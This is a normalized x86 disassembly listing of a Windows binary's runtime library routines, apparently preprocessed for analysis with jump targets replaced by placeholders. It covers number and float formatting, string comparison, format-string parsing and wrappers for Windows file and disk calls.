fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408430
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408364
mov edx esi
pop eax
call sub_4040f8
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408458
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_4082f8
mov edx esi
pop eax
call sub_4040f8
add esp 0x20
pop esi
retn
xor edx edx
sub_408480
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c60
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407f4c
sub_4084d4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c60
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4084f4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404e80
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408514
mov eax [ rw-data ]
call sub_4050b0
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_4050b0
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40405c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40405c
sub_4085a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_40820c
test al al
je r-xdata
sub_4085e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409824
mov edx eax
test dl dl
je r-xdata
call sub_408514
push ebp
mov eax [ rw-data ]
call sub_4050b8
mov edx eax
mov eax [ rw-data ]
call sub_4085a4
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_4050b8
mov edx eax
mov eax [ rw-data ]
call sub_4085a4
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_40867c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40405c
call sub_408514
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40405c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40405c
jmp r-xdata
pop esi
pop ebx
retn
sub_4086c8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4044c8
push eax
call CreateFileA
sub_408720
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4044c8
push eax
call CreateFileA
pop ebx
retn
sub_40874c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408778
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4087a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4087e4
push ebx
push esi
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c3c4
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408814
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
mov edi eax
mov eax ebx
call sub_4044c8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408b18
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c3c4
cmp al 0x2
jne r-xdata
dec edi
sub_408864
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408814
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404528
pop edi
pop esi
pop ebx
retn
sub_40889c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408814
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404008
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404528
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4088e4
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4044c8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_4040f8
add esp 0x108
pop esi
pop ebx
retn
sub_408920
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e5c
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e5c
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4089d0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4089f8
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408a2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4042c8
push eax
mov eax ebx
call sub_4044c8
mov edx eax
mov eax esi
pop ecx
call sub_4089f8
pop esi
pop ebx
retn
sub_408a50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4044c8
mov edx eax
mov ecx edi
mov eax ebx
call sub_4089f8
pop edi
pop esi
pop ebx
retn
sub_408a70
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408a94
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408ad4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b2c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408ba0
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408994
mov esi eax
inc esi
mov eax esi
call sub_408b80
mov ecx esi
mov edx ebx
call sub_4089c0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408bdc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c3e8
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4089c0
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407f4c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408c64
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408fbb
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408d46
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408d8e
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408d46
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408c58
pop edx
or edx edx
je r-xdata
sub_408d46
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408fbb
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408d8e
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408fbb
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408bdc
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408db5 ]
mov ebx ecx
sub cl 0x44
je sub_408364
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404230
jmp r-xdata
mov esi sub_404290
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408364
sub cl 0x44
je sub_4082f8
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_4082f8
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408364
mov ecx 0x10
cmp bl 0x58
je sub_4082f8
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408c34
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409174
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4082f8
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408fdc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408994
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408c64
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40901c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408994
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408c64
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_409070
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4042c8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408c64
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_4040f8
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404008
mov eax esi
mov edx ebx
call sub_404654
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408c64
mov edx esi
xchg edx eax
call sub_404654
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409130
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409174
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409448
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_409273
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_40927d
call sub_409273
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409130
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_4092d9
call sub_409273
call sub_40926a
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40926a
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409130
retn
xor ecx ecx
sub_409315
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40926a
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40926a
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40937a
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_4093ce
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409315
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409448
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409475
jmp r-xdata
call sub_409597
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409475
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d80
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409597
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
